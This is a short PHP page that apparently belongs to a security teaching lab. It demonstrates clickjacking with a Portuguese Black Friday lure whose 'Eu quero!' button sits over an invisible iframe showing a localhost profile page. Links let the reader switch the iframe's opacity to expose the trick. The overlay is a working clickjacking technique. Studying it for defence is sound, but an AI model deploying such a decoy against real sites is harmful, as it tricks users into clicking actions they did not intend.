<?php
defined('APP') or die('Access denied');
?>

<div style="position:absolute; ">
    <h3>Clickjacking!!!</h3>
    <p>Grande oportunidade! Nossa Black Friday está de volta com promoções incríveis! <a href="#" onclick="_0()">0%</a>&nbsp;<a href="#" onclick="_40()">40%</a>&nbsp;<a href="#" onclick="_100()">100%</a></p>
    <img src="img/black-friday.gif" alt="black-friday" height="260px">
    <button class="btn btn-danger" style="position: absolute; top: 350px; left:40px; width:170px;">Eu quero!</button>

</div>

<iframe id="target" style="position:absolute; top: 200px; opacity:0%;z-index:999; border:solid 2px red;" src="http://localhost/?page=profile" width="800" height="500"></iframe>


<script>
    function _0() {
        document.getElementById("target").style.opacity = "0%";
    }

    function _40() {
        document.getElementById("target").style.opacity = "40%";
    }

    function _100() {
        document.getElementById("target").style.opacity = "100%";
    }
</script>